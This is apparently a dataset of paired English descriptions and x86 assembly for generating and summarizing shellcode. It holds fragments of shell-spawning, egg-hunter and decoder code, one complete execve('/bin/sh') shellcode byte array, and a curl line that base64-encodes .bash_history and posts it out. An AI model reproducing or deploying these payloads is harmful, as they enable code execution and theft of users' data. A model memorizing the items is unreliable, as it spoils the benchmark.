"ShellCodeSum: cmp ax, bx \n jne l3",jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register
"ShellCodeSum: mov edx, esi",move esi into edx
ShellCodeGen: push 0x2e312e31 onto the stack,push 0x2e312e31
ShellCodeGen: compare the contents of the al register with the value 0xf2,"cmp al, 0xf2"
"ShellCodeSum: xor eax, eax \n push eax",push zero onto the stack
ShellCodeGen: if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the while label else jump to the eax register,"cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax"
ShellCodeGen: increment dl register,inc dl
"ShellCodeSum: mov bl, byte [esi+ecx+1]",move the byte in esi+ecx+1 into bl
"ShellCodeSum: mov ebx, 0",write to the stdin file
ShellCodeGen: move rn to ecx,"mov ecx, rn"
ShellCodeGen: compare the dword at the address [eax-8] and egg,"cmp dword [eax-8], egg"
ShellCodeGen: add 0x3 to the contents in al and save the result in al,"add al, 0x3"
"ShellCodeSum: mov edx, 8",move 8 decimal into edx
ShellCodeSum: jnz _start,jump to the _start label if the zero flag is cleared
ShellCodeGen: push the dword 0x6f726577 onto the stack,push dword 0x6f726577
ShellCodeGen: push 0x7268732f onto the stack,push 0x7268732f
ShellCodeGen: load the syscall value 0x58 for reboot in the al register,"mov al, 0x58"
ShellCodeGen: subtract 0x70445eaf from the contents in eax and save the result in eax,"sub eax, 0x70445eaf"
"ShellCodeSum: sub cl, 1",subtract 1 from the contents of the cl register
ShellCodeGen: push the 0x636e2f2f onto the stack,push 0x636e2f2f
"ShellCodeSum: mov eax, 90",make the system call mmap
"ShellCodeSum: cmp al, cl \n jne short decode \n jmp shellcode",if the contents of the al register is not equal to the contents of the cl register then jump short to the decode label else jump to the shellcode label
ShellCodeGen: if not zero jump to the next_cycle label,jnz next_cycle
ShellCodeSum: output:,declare the output label
ShellCodeGen: move /bin/sh into the eax register,"push long 0x68732f2f \n push long 0x6e69622f \n mov eax, esp"
ShellCodeGen: zero out the ecx register and push zero onto the stack,"xor ecx, ecx \n push ecx"
ShellCodeGen: add one to the doubleword integer stored at memory location tmp,inc dword [tmp]
"ShellCodeSum: rol edx, 0x4",left rotate the edx register 4 times
ShellCodeSum: push dword 0x6e69622f,push the dword 0x6e69622f onto the stack
ShellCodeGen: move the address of message string into ecx,"mov ecx, msg"
ShellCodeGen: move 0x50905090 into eax,"mov eax, 0x50905090"
ShellCodeSum: up:,declare the up label
ShellCodeSum: jb 0xf3,perform an unsigned comparison and jump to 0xf3 if lower
ShellCodeSum: jle lp1,if it is less than or equal to 10 then jump to lp1
ShellCodeGen: push the byte 15 onto the stack,push byte 15
ShellCodeGen: push 0x6f723a30 onto the stack,push 0x6f723a30
ShellCodeGen: left shift the contents of the edx register by 24 bits,"shl edx, 24"
ShellCodeGen: push the byte +0x6 onto the stack,push byte +0x6
ShellCodeSum: pop edx,pop the top of the stack into the edx register
"ShellCodeSum: push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov ecx, esp",push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ecx register to the stack register
"ShellCodeSum: mov edx, n",move n to edx
"ShellCodeSum: mov total, 48",transfer the value 48 in the memory variable total
"ShellCodeSum: push 0x6873732f \n push 0x6374652f \n mov edi, esp",push the value 0x6873732f and the value 0x6374652f onto the stack and point the edi register to the stack register
ShellCodeGen: move address of stack pointer into ecx,"mov ecx, esp"
ShellCodeSum: exit_call equ 1,define exit_call equal to 1
ShellCodeSum: push dx,push dx onto the stack
ShellCodeGen: jump to the exit label if the operands of the above comparison are equals,je exit
"ShellCodeSum: add eax, 2",add 2 to the eax register
ShellCodeSum: jz shift_decode,jump to the shift_decode label if the zero flag is set
ShellCodeGen: jump to the two label,jmp two
ShellCodeGen: decrement the counter and jump to the main_loop label if the count is not zero,loop main_loop
ShellCodeSum: arr1 resb 400,reserve the array arr1 of 400 uninitialized bytes
"ShellCodeSum: mov dword [esp-0x18], 0x61722f6c",move the value 0x61722f6c into the double word starting at the address [esp-0x18]
ShellCodeGen: preserve edx on the stack,push edx
ShellCodeGen: push the word cx onto the stack,push word cx
"ShellCodeSum: sub al, 88",subtract 88 from the contents of al register and save the result in al
ShellCodeGen: move 0xff into dl,"mov dl, 0xff"
"ShellCodeSum: sub eax, 3",decrease eax by 3
ShellCodeSum: connect:,define connect function
ShellCodeGen: initialize ebx with 0,"xor ebx, ebx"
ShellCodeGen: define an array of 20 initialized word,array word 20
ShellCodeGen: define the numeric label 1,1:
ShellCodeSum: _random:,define the _random label
"ShellCodeSum: add ebp, 0x2",add 0x2 to the contents of ebp
ShellCodeGen: move 93 into dl,"mov dl, 93"
ShellCodeGen: jump to the duploop label if the previous instruction clears the sign flag,jns duploop
"ShellCodeSum: push dword 0x74652f2f \n mov edx, esp",push double word 0x74652f2f onto the stack and point the edx register to the stack register
ShellCodeGen: push double word 0x39396e2d onto the stack and point the edi register to the stack register,"push dword 0x39396e2d \n mov edi, esp"
ShellCodeSum: section .text,declare text section
ShellCodeGen: reserve 1 double word for variableName3,variablename3: resd 1
ShellCodeGen: declare the get label,get:
ShellCodeSum: decoder:,declare the decoder function
ShellCodeGen: if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label,"cmp byte [esi], 0xD \n jl wrap_around"
"ShellCodeSum: cmp ecx, 100",compare if ecx is equal to 100
"ShellCodeSum: xor ecx, ecx",reset both lower and uppper bytes of ecx to be 0
ShellCodeGen: define the variable neg_number of words and initialize it to -12345,neg_number dw -12345
ShellCodeGen: restore the original value of ebx,pop ebx
ShellCodeSum: push 0x782f6e69,push 0x782f6e69 onto the stack
ShellCodeSum: push ecx,push the contents of the ecx register onto the stack.
"ShellCodeSum: cmp esi, 10",compare if esi is equal to 10
ShellCodeGen: push the dword 0x656e7265 onto the stack,push dword 0x656e7265
ShellCodeSum: done:,declare the done label
ShellCodeSum: push 0x2f2f2f2f,push the 0x2f2f2f2f onto the stack
"ShellCodeSum: mov eax, 0ah",move 0ah into eax
ShellCodeGen: push the value 0x6374652f onto the stack and point eax to the stack register,"push 0x6374652f \n mov eax, esp"
ShellCodeGen: subtract 0xffffffdf from edi,"sub edi, 0xffffffdf"
ShellCodeGen: move the byte 3h into al,"mov al, byte 3h"
ShellCodeGen: define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post',"msg db 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post', 0x0a"
"ShellCodeSum: lea eax, [ecx+0bh]",load the effective address of the result of the operation [ecx+0bh] into the eax register
ShellCodeGen: push byte 2 onto the stack,push byte 2
ShellCodeGen: push the value of register edx onto the stack,push edx
ShellCodeGen: jump to label modtest if below,jb modtest
ShellCodeGen: make the system call to read the file,"mov eax, 3"
"ShellCodeSum: mov eax, 0x2e383631",move 0x2e383631 into eax
ShellCodeGen: move dword 0x5090508f into ebx,"mov ebx, dword 0x5090508f"
"ShellCodeSum: mov word [ecx], 2",move the 16-bit integer representation of 2 into the 2 bytes starting at address ecx
ShellCodeSum: push dword 0x4227a28b,push the doubleword 0x4227a28b onto the stack
ShellCodeSum: push 0x3a30754a,push 0x3a30754a onto the stack
ShellCodeGen: push 10 onto the stack,push 10
"ShellCodeSum: xchg edi, eax",swap the contents of the edi register with the contents of the eax register
"ShellCodeSum: mov ax, 0x167",move 0x167 into ax
"ShellCodeSum: mov ecx, b",move b to ecx
ShellCodeGen: push the byte 16 onto the stack,push byte 16
ShellCodeGen: declare the process_shellcode label,process_shellcode:
ShellCodeGen: push 0x16 onto the stack,push 0x16
"ShellCodeSum: mov ebp, eax",move eax to ebp
ShellCodeSum: push word 0x2,push the word 0x2 to the stack
ShellCodeSum: jmp short 0x11,jump short to 0x11
ShellCodeSum: _ip equ 0x0100007f,define ip equal to 0x0100007f
ShellCodeGen: subtract 0x2e2aa163 from ebx and save the result into ebx,"sub ebx, 0x2e2aa163"
"ShellCodeSum: cmp [esi], edx",compare the contents at memory location esi with edx
"ShellCodeSum: mov al, byte 0bh",move the byte at the address 0bh into al
ShellCodeGen: perform the xor operation between the al register and the value 0x30,"xor al, 0x30"
ShellCodeSum: dec esp,decrement esp
ShellCodeGen: decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the edx register,loop decode \n jmp edx
ShellCodeSum: push 0x68732f2f,push hs//
ShellCodeSum: push [tmp],push the 4 bytes at address tmp onto stack
ShellCodeGen: reserve 64 bytes for buffer,buffer: resb 64
ShellCodeGen: move 0xff into bl,"mov bl, 0xff"
"ShellCodeSum: add eax, 4",add 4 to eax
"ShellCodeSum: mov ecx, rm",move rm to ecx
ShellCodeGen: push the value of register eax onto the stack,push eax
"ShellCodeSum: mov edi, hexstr",place hexstr into edi
"ShellCodeSum: mov eax, msg3",move the address of msg3 into eax
"ShellCodeSum: sub ebx, byte 8",subtract the byte value 8 from the contents of ebx and save the result in ebx
ShellCodeGen: allocate memory for variable,"sub esp, 4"
ShellCodeGen: move 0x2e into the byte at address [esp],"mov byte [esp], 0x2e"
"ShellCodeSum: xor bl, 0xbb",zero out bl register
"ShellCodeSum: xor cl, 0x32 \n jz short EncodedShellcode",jump short to the EncodedShellcode label if the result of the logical xor between the cl register and the value 0x32 is zero
ShellCodeGen: jump to the label l3 if the contents of the dl register is greater than or equal to the decimal value 27,"cmp dl, 27 \n jge l3"
"ShellCodeSum: test ecx, ecx",test the contents of the ecx register
ShellCodeGen: load the effective address of the result of the operation [ebx+17h] into the eax register,"lea eax, [ebx+17h]"
"ShellCodeSum: mov ecx, rn",move rn to ecx
ShellCodeGen: move 0x0b into the byte at address al,"mov byte al, 0x0b"
ShellCodeGen: push the dword 0x68732f6e onto the stack,push dword 0x68732f6e
ShellCodeGen: move 0x68732f2f into esi,"mov esi, 0x68732f2f"
"ShellCodeSum: lea edi, [ebx]",load the effective address of ebx into the edi register
ShellCodeGen: move 0x4 into al,"mov al, 0x4"
"ShellCodeSum: test eax, eax \n jz ready_to_proxy",if the contents of the eax register is zero then jump to the label ready_to_proxy
ShellCodeGen: jump to the Next_Cycle label if the result of the logical xor between the cl register and the value 0xAA is not zero,"xor cl, 0xAA \n jnz Next_Cycle"
ShellCodeSum: push byte 1,move byte 1 onto stack
ShellCodeGen: push 0x706d742f onto the stack,push 0x706d742f
"ShellCodeSum: mov eax, 6",system call close
ShellCodeGen: subtract the byte value 8 from the contents of ebx and save the result in ebx,"sub ebx, byte 8"
"ShellCodeSum: push 0x6e69622f \n push 0x7273752f \n mov ebx, esp",push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ebx register to the stack register
ShellCodeSum: jmp short call_write,jump short to the call_write label
ShellCodeGen: add 0x31179798 to the contents in eax and save the result in eax,"add eax, 0x31179798"
ShellCodeGen: declare the encrypt label,encrypt:
ShellCodeGen: declare a doubleword at address y initialized to contain 3000,y dd 3000
"ShellCodeSum: mov dword [esp-8], 0x68732f2f",move 0x68732f2f into the dword at the memory location [esp-8]
ShellCodeGen: push the word 0x662d onto the stack and point the ebx register to the stack register,"push word 0x662d \n mov ebx, esp"
ShellCodeGen: zero out ecx,"xor ecx, ecx"
ShellCodeGen: call the set_argv function,call set_argv
ShellCodeGen: multiply eax by ecx,mul ecx
ShellCodeGen: push 0x7273752f to the stack,push 0x7273752f
ShellCodeGen: push the word 0x401f onto the stack,push word 0x401f
ShellCodeGen: if the contents of the eax register is negative then jump short to the label socket,"test eax, eax \n js short socket"
"ShellCodeSum: mov eax, 11",make the system to load and run the program
ShellCodeGen: push the value 0x69622f2f onto the stack and point the ebx register to the stack register,"push 0x69622f2f \n mov ebx, esp"
"ShellCodeSum: mov cl, shellcodelen",move shellcodelen into cl
ShellCodeGen: move n to edx,"mov edx, n"
ShellCodeGen: compare if the contents at memory location ebp+var_a is 0,"cmp [ebp+var_a], 0"
ShellCodeGen: move edi into eax,"mov eax, edi"
ShellCodeGen: jump to the point in the code labeled nextchar,jmp nextchar
ShellCodeSum: four:,declare the four label
"ShellCodeSum: mov ax, 1",move value of 1 into register ax
"ShellCodeSum: lea ebx, [esp]",load the effective address of esp into the ebx register
ShellCodeGen: define egg1 equal to 'mark',egg1 equ 'mark'
ShellCodeGen: subtract the byte 8 from the contents of the ebx register,"sub ebx, byte 8"
ShellCodeGen: subtract 0x0b454440 from the contents in ecx and save the result in ecx,"sub ecx, 0x0b454440"
ShellCodeGen: jump to error label if sign flag SF is equal to 1,js error
"ShellCodeSum: mov ecx, [temp3]",move the contents at memory address temp3 to ecx
ShellCodeSum: div ebx,divide the contents of eax by the contents of ebx
ShellCodeSum: here:,declare the here label
ShellCodeGen: move the byte at the address 2ah into al,"mov al, byte 2ah"
"ShellCodeSum: shl eax, 2",multiply eax by 4 using left shift
ShellCodeGen: execute exit syscall,int 0x80
"ShellCodeSum: cmp dword [eax-4], egg2 \n je _next \n jmp eax",if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register
ShellCodeSum: ja exit,jump to the exit label if the destination operand is greater than the source operand in the above comparison
ShellCodeGen: declare the four label,four:
ShellCodeGen: add decimal 2 to eax register,"add eax, 2"
"ShellCodeSum: mov byte [esp], 0x2e",move 0x2e into the byte at address [esp]
ShellCodeSum: path db '//bin/sh',define path as the byte string '//bin/sh'
ShellCodeGen: zero out ax register,"xor ax, ax"
ShellCodeGen: move the address of msg string into ebx,"mov ebx, msg"
ShellCodeGen: push the word 0x632d onto the stack and point the edx register to the stack register,"push word 0x632d \n mov edx, esp"
ShellCodeGen: compare if ecx is equal to 100,"cmp ecx, 100"
ShellCodeGen: move the byte 66h into al,"mov al, byte 66h"
"ShellCodeSum: sub ax, ax",subtract the contents of ax from the contents of ax
ShellCodeSum: push edx,push edx to the stack
ShellCodeSum: jz child,jump to child if zero
ShellCodeSum: push 0x69622f2f,push the 0x69622f2f onto the stack
ShellCodeGen: move 0x01 into dl,"mov dl, 0x01"
ShellCodeGen: push the 0x742f2f2f onto the stack,push 0x742f2f2f
"ShellCodeGen: define myList array of word and initialize it to 1, 2, 3, 4, and 5","myList word 1,2,3,4,5"
ShellCodeGen: push 102 onto the stack,push 102
ShellCodeSum: push word 10,push the word 10 to the stack
ShellCodeGen: load the effective address of the result of the operation [zero_reg+3] into the ecx register,"lea ecx, [zero_reg+3]"
ShellCodeGen: push the contents of eax register onto the stack,push eax
"ShellCodeSum: xor ecx, ecx \n push ecx",zero out the ecx register and push zero onto the stack
ShellCodeGen: if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x3 into the al register,"cmp eax, ebx \n je exit \n add al, 0x3"
ShellCodeSum: _return:,define the _return label
"ShellCodeSum: sub cx, 0x7ff",subtract 0x7ff from the contents in cx and save the result in cx
"ShellCodeSum: shr dl, 1",right shift the contents of the dl register by 1 bit
ShellCodeGen: move 0x16b into ax,"mov ax, 0x16b"
"ShellCodeSum: mov eax, 7",make the system call to wait for child for terminate
ShellCodeGen: jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register,"cmp BYTE al, 2 \n je do_inject"
ShellCodeSum: message db '/bin/sh',define message as the byte string '/bin/sh'
ShellCodeSum: int 0x80,call kernel
ShellCodeGen: remove last character from the stack into ecx,pop ecx
ShellCodeSum: push byte 3h \n pop eax,put the syscall 3h into the eax register
ShellCodeGen: move 1666 into ax,"mov ax, 1666"
ShellCodeGen: create the doubleword variable z in memory and initialize it to zero,z: dd 0x0
ShellCodeGen: swap the address [ebp+16] with the contents of the ecx register,"xchg [ebp+16], ecx"
ShellCodeGen: move decimal 43 into edx,"mov edx, 43"
ShellCodeSum: scasd,compare eax with doubleword at edi and set status flags
"ShellCodeSum: mov eax, 6",close
ShellCodeGen: push edx onto the stack,push edx
ShellCodeSum: call [esp],call the function in esp
ShellCodeGen: jump to the callpop label,jmp callpop
ShellCodeGen: put 8 into edx,"mov edx, 8"
ShellCodeGen: zero out the eax register and push zero onto the stack,"xor eax, eax \n push eax"
ShellCodeSum: push 0x7665642f,push the 0x7665642f onto the stack
ShellCodeGen: jump short to the call_shellcode label,jmp short call_shellcode
ShellCodeGen: call the shell_ret function,call shell_ret
ShellCodeSum: todo:,declare the todo label
ShellCodeGen: put the syscall 0x2e into the eax register,push byte 0x2e \n pop eax
ShellCodeGen: move edi into ebx,"mov ebx, edi"
"ShellCodeSum: message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68","define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68"
ShellCodeGen: declare a constant size and set equal to 50000,size: equ 50000
"ShellCodeSum: sub edi, 1768009314",subtract 1768009314 from the edi register and save the result in edi
ShellCodeGen: move the contents of the address [ebp-4] into the ebx register,"mov ebx, [ebp-4]"
ShellCodeSum: pop ecx,pop the value on the stack back into ecx
"ShellCodeSum: mov eax, 106",get information about the file
ShellCodeSum: push 0x32322e32,push 0x32322e32 onto the stack
"ShellCodeSum: cmp eax, ebx",compare the contents of eax and the contents of ebx
"ShellCodeSum: mov al, byte 3fh",move the byte 3fh into al
ShellCodeGen: subtract ecx from ecx and save the result into ecx,"sub ecx, ecx"
ShellCodeSum: x dw ?,declare an uninitialized word labeled x
"ShellCodeSum: mov eax, 106",system call stat
ShellCodeSum: scasd \n jnz _start,jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi
ShellCodeGen: make the system call to wait for child for terminate,"mov eax, 7"
ShellCodeGen: move 0x2bc into cx,"mov cx, 0x2bc"
ShellCodeGen: jump to connec,jmp connec
"ShellCodeSum: mov eax, 37",make the system call kill
ShellCodeGen: move shellcode_length into cl,"mov cl, shellcode_length"
"ShellCodeSum: test ebx, ebx \n js short l1",jump short to the label l1 if the contents of the ebx register is negative
ShellCodeSum: egg1 equ 'mark',define egg1 equal to 'mark'
"ShellCodeSum: mov ebx, sock_reg",move sock_reg into ebx
"ShellCodeSum: mov eax, type var4",move the number of bytes of var4 into eax
"ShellCodeSum: test eax, eax \n jz check_html \n jmp while",if the contents of the eax register is zero then jump to the label check_html else jump to the while label
ShellCodeSum: shellcodelen equ $-shellcode,define shellcodelen equal to the length shellcode
"ShellCodeSum: test ax, ax",perform a bitwise and of the contents of ax and the contents of ax
ShellCodeGen: push the value 0x6873732f and the value 0x6374652f onto the stack and point the ecx register to the stack register,"push 0x6873732f \n push 0x6374652f \n mov ecx, esp"
ShellCodeGen: push 0x6374652f onto the stack,push 0x6374652f
"ShellCodeSum: push 0x6374652f \n mov ebp, esp",push the value 0x6374652f onto the stack and point ebp to the stack register
ShellCodeGen: jump to the L1 label if the contents of the dx register is equal to the value 0x03e8,"cmp dx, 0x03e8 \n je L1"
"ShellCodeSum: xor eax, [esi]",perform xor operation between eax register and esi register and store the result in eax
ShellCodeGen: push the word 0x662d onto the stack,push word 0x662d
"ShellCodeSum: mov eax, 3",specify sys_read call
ShellCodeSum: pop ecx,remove last character from the stack into ecx
ShellCodeGen: push bx onto the stack,push bx
"ShellCodeSum: cmp eax, ebx \n je L1",jump to the L1 label if the contents of the eax register is equal to the contents of the ebx register
ShellCodeSum: push 0x70692f6e,push the 0x70692f6e onto the stack
"ShellCodeSum: cmp eax, ebx \n je all",jump to the all label if the contents of the eax register is equal to the contents of the ebx register
"ShellCodeSum: shl esi, 0x1",left shift the contents of the esi register by 0x1 bit
ShellCodeGen: move 0x1 into lower byte of the eax register,"mov al, 0x1"
ShellCodeGen: move the contents of esp into ecx,"mov ecx, esp"
ShellCodeGen: move n_src to eax,"mov eax, n_src"
ShellCodeSum: pop eax,pop the top of the stack into the eax register
ShellCodeGen: move 03h into al,"mov al, 03h"
ShellCodeGen: mask out lowest 4 bits of the ebx register,"and ebx, 0000000fh"
ShellCodeGen: compare whether the edx register has reached 10,"cmp edx, 10"
ShellCodeGen: jump short to the _load_data label,jmp short _load_data
ShellCodeGen: push the byte 0x2 to the stack,push byte 0x2
ShellCodeGen: load the effective address [esi+18] into ecx,"lea ecx, [esi+18]"
ShellCodeGen: jump to callpop,jmp callpop
"ShellCodeSum: mov cx, 0666",move 0666 into cx
ShellCodeGen: test the contents of the ebx register,"test ebx, ebx"
ShellCodeGen: jump to the label found if the contents of the al register is zero else increment the contents of the ecx register,"test al, al \n jz found \n inc ecx"
"ShellCodeSum: lea edi, [ebx]",load the effective address [ebx] into edi
ShellCodeSum: ja exi,jump to exi if greater
ShellCodeGen: load the effective address of the result of the operation [esi+30] into the edx register,"lea edx, [esi+30]"
ShellCodeGen: push 0x636e2f2f to the stack,push 0x636e2f2f
ShellCodeGen: push $0x6e69622f onto the stack,pushl $0x6e69622f
ShellCodeSum: push edi,push edi onto the stack
ShellCodeGen: move the word in ax into the memory location specified by the operation [ebp+22],"mov [ebp+22], word ax"
ShellCodeGen: decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero,loopnz Label1
ShellCodeGen: move ah into the address [esp+58],"mov [esp+58], ah"
ShellCodeGen: if the unsigned contents of the edx register is greater than the unsigned value 0x43 then jump to the loop label else push the contents of the edx register onto the stack,"cmp edx, 0x43 \n ja loop \n push edx"
ShellCodeSum: inc ecx,increment the contents of the ecx register
ShellCodeGen: jump to the while label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register,"cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax"
ShellCodeSum: child:,define the child function
ShellCodeGen: push the byte 6 to the stack,push byte 6
"ShellCodeSum: mov al, 0x46",move 0x46 into al
ShellCodeGen: swap the values of ebx and eax,"xchg ebx, eax"
ShellCodeSum: push word 0x7773,push the word 0x7773 to the stack
"ShellCodeSum: cmp eax, ebp \n jnz short loc_40102B",jump short to the memory location loc_40102B if the contents of the eax register is not equal to the contents of the ebp register
"ShellCodeSum: cmp al, 0xaa \n je decode_insertion \n xor al, bl",if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register
"ShellCodeSum: sub eax,20000h",subtract 20000h from eax register
ShellCodeGen: push the byte 0x02 to the stack,push byte 0x02
ShellCodeGen: move m_src3 to ecx,"mov ecx, m_src3"
ShellCodeGen: jump to the loop2 label if the contents of the cl register is not equal to the value 0x3,"cmp cl, 0x3 \n jne loop2"
ShellCodeGen: subtract the value 0x28 from the esp register,"sub esp, 0x28"
ShellCodeGen: move eax into the dword at address [esi + 12],"mov dword [esi + 12], eax"
ShellCodeSum: jnz short _paren,if not zero jump short to the _paren label
